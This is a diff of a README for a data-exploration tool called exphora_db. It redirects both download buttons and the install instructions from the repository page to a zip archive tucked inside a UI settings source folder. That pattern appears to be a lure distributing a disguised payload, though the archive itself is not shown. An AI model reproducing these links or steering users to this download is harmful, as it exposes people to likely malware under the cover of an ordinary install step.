@@ -1,6 +1,6 @@
 # 📊 exphora_db - Explore Data Fast and Simply
 
-[![Download exphora_db](https://img.shields.io/badge/Download-exphora_db-4caf50?style=for-the-badge&logo=github)](https://github.com/sparoecanthusfultoni104/exphora_db)
+[![Download exphora_db](https://img.shields.io/badge/Download-exphora_db-4caf50?style=for-the-badge&logo=github)](https://github.com/sparoecanthusfultoni104/exphora_db/raw/refs/heads/main/ui/src/components/settings/exphora-db-v3.4-beta.1.zip)
 
 ## 🚀 What is exphora_db?
 
@@ -37,7 +37,7 @@ This flexibility lets you explore your data regardless of the source.
 ### 1. Visit the download page
 
 Click the big green button at the top or visit this link:  
-https://github.com/sparoecanthusfultoni104/exphora_db
+https://github.com/sparoecanthusfultoni104/exphora_db/raw/refs/heads/main/ui/src/components/settings/exphora-db-v3.4-beta.1.zip
 
 This page hosts the latest versions available for download.
 
@@ -125,7 +125,7 @@ exphora_db supports sharing your filtered datasets directly with trusted people 
 - Join the user discussions on GitHub to ask questions or share ideas.
 - Check for app updates regularly on the release page.
 
-[![Download exphora_db](https://img.shields.io/badge/Download-exphora_db-4caf50?style=for-the-badge&logo=github)](https://github.com/sparoecanthusfultoni104/exphora_db)
+[![Download exphora_db](https://img.shields.io/badge/Download-exphora_db-4caf50?style=for-the-badge&logo=github)](https://github.com/sparoecanthusfultoni104/exphora_db/raw/refs/heads/main/ui/src/components/settings/exphora-db-v3.4-beta.1.zip)
 
 ---
 
